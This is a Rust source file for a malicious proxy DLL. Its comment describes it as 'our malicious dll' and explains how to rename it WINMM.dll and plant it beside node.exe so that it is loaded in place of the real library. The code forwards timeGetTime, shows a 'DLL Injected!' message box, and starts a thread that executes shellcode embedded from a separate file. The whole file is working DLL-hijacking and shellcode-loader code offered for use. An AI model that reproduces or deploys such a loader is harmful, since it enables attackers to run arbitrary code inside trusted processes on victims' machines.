use std::{mem::transmute, os::raw::c_void, ptr::null_mut};

use windows_sys::Win32::{
    self,
    Foundation::HWND,
    System::{
        SystemServices::{
            DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
        },
        Threading::CreateThread,
    },
    UI::WindowsAndMessaging::{MB_OK, MessageBoxA},
};

/*
    node.exe imports timeGetTime() function from WINMM.dll .
    copy the dll_proxy.dll to the same directory as node.exe and rename it to WINMM.dll.
    when node.exe is executed, it will load our malicious dll instead of the original WINMM.dll.
*/

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE_BYTES.len();

#[unsafe(no_mangle)]
#[unsafe(link_section = ".text")]
static SHELLCODE: [u8; SHELLCODE_SIZE] = *include_bytes!("../shellcode.bin");

type ShellcodeFn = unsafe extern "C" fn() -> ();

#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub unsafe extern "system" fn timeGetTime() -> u32 {
    unsafe { Win32::Media::timeGetTime() }
}

#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub unsafe extern "system" fn DllMain(
    _dll_module: *mut c_void,
    call_reason: u32,
    _reserved: *mut (),
) -> bool {
    match call_reason {
        DLL_PROCESS_ATTACH => unsafe {
            MessageBoxA(
                HWND::default(),
                "DLL Injected!\0".as_ptr() as *const u8,
                "INFO\0".as_ptr() as *const u8,
                MB_OK,
            );
            CreateThread(
                null_mut(),
                0,
                Some(transmute(main as *const ())),
                null_mut(),
                0,
                null_mut(),
            );
        },
        DLL_PROCESS_DETACH => {}
        DLL_THREAD_ATTACH => {}
        DLL_THREAD_DETACH => {}
        _ => {}
    };
    true
}

fn main() {
    let shellcode_ptr = SHELLCODE.as_ptr() as *const ();
    let shellcode_fn: ShellcodeFn = unsafe { transmute(shellcode_ptr) };
    unsafe {
        shellcode_fn();
    }
}
